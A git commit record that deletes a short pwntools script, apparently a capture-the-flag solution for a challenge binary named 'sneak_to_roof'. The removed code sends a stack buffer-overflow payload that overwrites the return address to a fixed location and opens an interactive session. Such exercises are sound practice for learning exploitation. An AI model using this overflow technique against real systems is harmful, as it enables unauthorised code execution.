c3a82fd0873a43260fc777ba4aa4a2ba9c4cd4f7
Kartik-Sama <44060484+Kartik-Sama@users.noreply.github.com>
2020-06-18 14:03:15 +0530

    Delete solution2.py

--- bin/bin3/solution2.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-
-#r = process('./sneak_to_roof')
-r = remote('localhost',6703)
-
-payload = b'A'*0x80 + b'A'*8 + p64(0x00000000004006ad);
-r.sendline("dummy")
-r.sendline(payload)
-r.interactive()
